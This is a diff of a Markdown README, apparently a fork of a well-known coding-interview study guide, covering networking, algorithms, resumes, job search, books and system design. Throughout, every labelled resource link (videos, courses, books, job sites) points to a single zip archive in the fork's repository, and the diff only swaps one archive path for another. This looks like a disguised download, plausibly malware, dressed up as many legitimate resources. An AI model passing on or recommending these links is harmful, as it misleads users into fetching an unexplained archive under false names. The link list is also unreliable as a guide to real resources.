-    - [ ] [Big And Little Endian](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Big Endian Vs Little Endian (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Big And Little Endian Inside/Out (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Big And Little Endian](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Big Endian Vs Little Endian (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Big And Little Endian Inside/Out (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - Very technical talk for kernel devs. Don't worry if most is over your head.
         - The first half is enough.
 
 - ### Networking
     - **if you have networking experience or want to be a reliability engineer or operations engineer, expect questions**
     - Otherwise, this is just good to know
-    - [ ] [Khan Academy](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [UDP and TCP: Comparison of Transport Protocols (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [TCP/IP and the OSI Model Explained! (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Packet Transmission across the Internet. Networking & TCP/IP tutorial. (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [HTTP (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [SSL and HTTPS (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [SSL/TLS (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [HTTP 2.0 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Video Series (21 videos) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Subnetting Demystified - Part 5 CIDR Notation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Khan Academy](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [UDP and TCP: Comparison of Transport Protocols (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [TCP/IP and the OSI Model Explained! (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Packet Transmission across the Internet. Networking & TCP/IP tutorial. (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [HTTP (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [SSL and HTTPS (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [SSL/TLS (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [HTTP 2.0 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Video Series (21 videos) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Subnetting Demystified - Part 5 CIDR Notation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Sockets:
-        - [ ] [Java - Sockets - Introduction (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Socket Programming (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [Java - Sockets - Introduction (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Socket Programming (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ---
 
@@ -1210,11 +1210,11 @@ Graphs can be used to represent many problems in computer science, so this secti
     It's nice if you want a refresher often.
 
 - [ ] Series of 2-3 minutes short subject videos (23 videos)
-    - [Videos](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Videos](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - [ ] Series of 2-5 minutes short subject videos - Michael Sambol (18 videos):
-    - [Videos](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Sedgewick Videos - Algorithms I](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Sedgewick Videos - Algorithms II](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Videos](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Sedgewick Videos - Algorithms I](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Sedgewick Videos - Algorithms II](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ---
 
@@ -1222,47 +1222,47 @@ Graphs can be used to represent many problems in computer science, so this secti
 
 - See Resume prep information in the books: "Cracking The Coding Interview" and "Programming Interviews Exposed"
 - I don't know how important this is (you can do your own research) but here is an article on making your resume ATS Compliant:
-    - [How to Create or Check if your Resume is ATS Compliant](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- ["This Is What A GOOD Resume Should Look Like" by Gayle McDowell (author of Cracking the Coding Interview)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip), 
+    - [How to Create or Check if your Resume is ATS Compliant](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- ["This Is What A GOOD Resume Should Look Like" by Gayle McDowell (author of Cracking the Coding Interview)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip), 
     - Note by the author: "This is for a US-focused resume. CVs for India and other countries have different expectations, although many of the points will be the same."
 
 
 ## Find a Job
 
-- [Simplify](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Simplify](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Simplify is a platform that offers curated lists of jobs like *Software Roles at Unicorns* and *SWE Roles at Big Tech Companies*. They also offer a
      free browser extension that helps you autofill job applications on millions of sites.
-- [Sites for Finding Jobs](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Sites for Finding Jobs](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## Interview Process & General Interview Prep
 
-- [ ] [How to Pass the Engineering Interview in 2021](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Demystifying Tech Recruiting](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [ ] [How to Pass the Engineering Interview in 2021](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Demystifying Tech Recruiting](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - [ ] How to Get a Job at the Big 4:
-    - [ ] [How to Get a Job at the Big 4 - Amazon, Facebook, Google & Microsoft (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [How to Get a Job at the Big 4.1 (Follow-up video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [How to Get a Job at the Big 4 - Amazon, Facebook, Google & Microsoft (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [How to Get a Job at the Big 4.1 (Follow-up video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - [ ] Cracking The Coding Interview Set 1:
-    - [ ] [Gayle L McDowell - Cracking The Coding Interview (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Cracking the Coding Interview with Author Gayle Laakmann McDowell (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Gayle L McDowell - Cracking The Coding Interview (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Cracking the Coding Interview with Author Gayle Laakmann McDowell (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - [ ] Cracking the Facebook Coding Interview:
-    - [ ] [The Approach](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Problem Walkthrough](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [The Approach](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Problem Walkthrough](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - Prep Courses:
-    - [Software Engineer Interview Unleashed (paid course)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip):
+    - [Software Engineer Interview Unleashed (paid course)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip):
         - Learn how to make yourself ready for software engineer interviews from a former Google interviewer.
-    - [Python for Data Structures, Algorithms, and Interviews (paid course)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip):
+    - [Python for Data Structures, Algorithms, and Interviews (paid course)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip):
         - A Python centric interview prep course which covers data structures, algorithms, mock interviews and much more.
-    - [Intro to Data Structures and Algorithms using Python (Udacity free course)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip):
+    - [Intro to Data Structures and Algorithms using Python (Udacity free course)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip):
         - A free Python centric data structures and algorithms course.
-    - [Data Structures and Algorithms Nanodegree! (Udacity paid Nanodegree)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip):
+    - [Data Structures and Algorithms Nanodegree! (Udacity paid Nanodegree)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip):
         - Get hands-on practice with over 100 data structures and algorithm exercises and guidance from a dedicated mentor to help prepare you for interviews and on-the-job scenarios.
-    - [Grokking the Behavioral Interview (Educative free course)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip):
+    - [Grokking the Behavioral Interview (Educative free course)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip):
         - Many times, it’s not your technical competency that holds you back from landing your dream job, it’s how you perform on the behavioral interview.
 
 Mock Interviews:
-- [https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip Mock interviewers from big companies](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip) - I used this and it helped me relax for the phone screen and on-site interview
-- [Pramp: Mock interviews from/with peers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip) - peer-to-peer model of practice interviews
-- [https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip Practice mock interview with senior engineers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip) - anonymous algorithmic/systems design interviews with senior engineers from FAANG anonymously
+- [https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip Mock interviewers from big companies](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip) - I used this and it helped me relax for the phone screen and on-site interview
+- [Pramp: Mock interviews from/with peers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip) - peer-to-peer model of practice interviews
+- [https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip Practice mock interview with senior engineers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip) - anonymous algorithmic/systems design interviews with senior engineers from FAANG anonymously
 
 ## Be thinking of for when the interview comes
 
@@ -1283,7 +1283,7 @@ Have a story, not just data, about something you accomplished.
 - What would you have done better at [job x / project y]?
 
 - If you find it hard to come up with good answers of these types of interview questions, here are some ideas: 
-    - [General Interview Questions and their Answers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [General Interview Questions and their Answers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## Have questions for the interviewer
 
@@ -1326,17 +1326,17 @@ You're never really done.
 
     These are here so you can dive into a topic you find interesting.
 
-- [The Unix Programming Environment](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [The Unix Programming Environment](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - An oldie but a goodie
-- [The Linux Command Line: A Complete Introduction](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [The Linux Command Line: A Complete Introduction](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - A modern option
-- [TCP/IP Illustrated Series](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Head First Design Patterns](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [TCP/IP Illustrated Series](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Head First Design Patterns](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - A gentle introduction to design patterns
-- [Design Patterns: Elements of Reusable Object-Oriente​d Software](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Design Patterns: Elements of Reusable Object-Oriente​d Software](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - AKA the "Gang Of Four" book, or GOF
     - The canonical design patterns book
-- [Algorithm Design Manual](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip) (Skiena)
+- [Algorithm Design Manual](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip) (Skiena)
     - As a review and problem recognition
     - The algorithm catalog portion is well beyond the scope of difficulty you'll get in an interview
     - This book has 2 parts:
@@ -1354,12 +1354,12 @@ You're never really done.
             - This book is better as an algorithm reference, and not something you read cover to cover.
     - Can rent it on Kindle
     - Answers:
-        - [Solutions](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip(Second_Edition))
-        - [Solutions](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Errata](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip~skiena/algorist/book/errata)
-- [Write Great Code: Volume 1: Understanding the Machine](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Solutions](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip(Second_Edition))
+        - [Solutions](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Errata](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip~skiena/algorist/book/errata)
+- [Write Great Code: Volume 1: Understanding the Machine](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - The book was published in 2004, and is somewhat outdated, but it's a terrific resource for understanding a computer in brief
-    - The author invented [HLA](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip), so take mentions and examples in HLA with a grain of salt. Not widely used, but decent examples of what assembly looks like
+    - The author invented [HLA](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip), so take mentions and examples in HLA with a grain of salt. Not widely used, but decent examples of what assembly looks like
     - These chapters are worth the read to give you a nice foundation:
         - Chapter 2 - Numeric Representation
         - Chapter 3 - Binary Arithmetic and Bit Operations
@@ -1370,10 +1370,10 @@ You're never really done.
         - Chapter 9 - CPU Architecture
         - Chapter 10 - Instruction Set Architecture
         - Chapter 11 - Memory Architecture and Organization
-- [Introduction to Algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Introduction to Algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - **Important:** Reading this book will only have limited value. This book is a great review of algorithms and data structures, but won't teach you how to write good code. You have to be able to code a decent solution efficiently
     - AKA CLR, sometimes CLRS, because Stein was late to the game
-- [Computer Architecture, Sixth Edition: A Quantitative Approach](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Computer Architecture, Sixth Edition: A Quantitative Approach](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - For a richer, more up-to-date (2017), but longer treatment
 
 ## System Design, Scalability, Data Handling
@@ -1396,71 +1396,71 @@ You're never really done.
         - simplicity and robustness
         - tradeoffs
         - performance analysis and optimization
-- [ ] **START HERE**: [The System Design Primer](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [System Design from HiredInTech](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [How Do I Prepare To Answer Design Questions In A Technical Interview?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [8 Things You Need to Know Before a System Design Interview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Database Normalization - 1NF, 2NF, 3NF and 4NF (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [System Design Interview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip) - There are a lot of resources in this one. Look through the articles and examples. I put some of them below
-- [ ] [How to ace a systems design interview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Numbers Everyone Should Know](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [How long does it take to make a context switch?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Transactions Across Datacenters (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [A plain English introduction to CAP Theorem](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [MIT 6.824: Distributed Systems, Spring 2020 (20 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [ ] **START HERE**: [The System Design Primer](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [System Design from HiredInTech](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [How Do I Prepare To Answer Design Questions In A Technical Interview?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [8 Things You Need to Know Before a System Design Interview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Database Normalization - 1NF, 2NF, 3NF and 4NF (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [System Design Interview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip) - There are a lot of resources in this one. Look through the articles and examples. I put some of them below
+- [ ] [How to ace a systems design interview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Numbers Everyone Should Know](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [How long does it take to make a context switch?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Transactions Across Datacenters (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [A plain English introduction to CAP Theorem](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [MIT 6.824: Distributed Systems, Spring 2020 (20 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - [ ] Consensus Algorithms:
-    - [ ] Paxos - [Paxos Agreement - Computerphile (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] Raft - [An Introduction to the Raft Distributed Consensus Algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Easy-to-read paper](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Infographic](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Consistent Hashing](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [NoSQL Patterns](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] Paxos - [Paxos Agreement - Computerphile (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] Raft - [An Introduction to the Raft Distributed Consensus Algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Easy-to-read paper](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Infographic](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Consistent Hashing](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [NoSQL Patterns](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - [ ] Scalability:
     - You don't need all of these. Just pick a few that interest you.
-    - [ ] [Great overview (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Great overview (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Short series:
-        - [Clones](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Database](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Cache](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Asynchronism](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Scalable Web Architecture and Distributed Systems](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Fallacies of Distributed Computing Explained](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Jeff Dean - Building Software Systems At Google and Lessons Learned (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Introduction to Architecting Systems for Scale](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Scaling mobile games to a global audience using App Engine and Cloud Datastore (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [How Google Does Planet-Scale Engineering for Planet-Scale Infra (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [The Importance of Algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Sharding](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Engineering for the Long Game - Astrid Atkinson Keynote(video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [7 Years Of YouTube Scalability Lessons In 30 Minutes](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [video](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [How PayPal Scaled To Billions Of Transactions Daily Using Just 8VMs](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [How to Remove Duplicates in Large Datasets](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [A look inside Etsy's scale and engineering culture with Jon Cowie (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [What Led Amazon to its Own Microservices Architecture](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [To Compress Or Not To Compress, That Was Uber's Question](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [When Should Approximate Query Processing Be Used?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Google's Transition From Single Datacenter, To Failover, To A Native Multihomed Architecture]( https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [The Image Optimization Technology That Serves Millions Of Requests Per Day](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
